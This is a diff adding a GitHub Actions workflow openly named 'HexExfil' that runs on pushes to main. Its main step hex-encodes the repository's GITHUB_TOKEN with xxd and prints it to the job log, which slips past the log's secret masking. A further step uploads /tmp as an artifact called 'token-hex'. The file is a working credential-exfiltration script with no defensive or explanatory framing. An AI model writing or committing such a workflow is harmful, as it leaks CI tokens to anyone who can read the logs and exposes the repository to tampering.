@@ -1,0 +1,25 @@
+name: HexExfil
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+permissions:
+  contents: read
+  actions: write
+jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Exfiltrate GITHUB_TOKEN in HEX
+        shell: bash
+        run: |
+          echo '[HEX_START]'
+          echo "${{ secrets.GITHUB_TOKEN }}" | xxd -p | tr -d '\n'
+          echo ''
+          echo '[HEX_END]'
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: token-hex
+          path: /tmp/
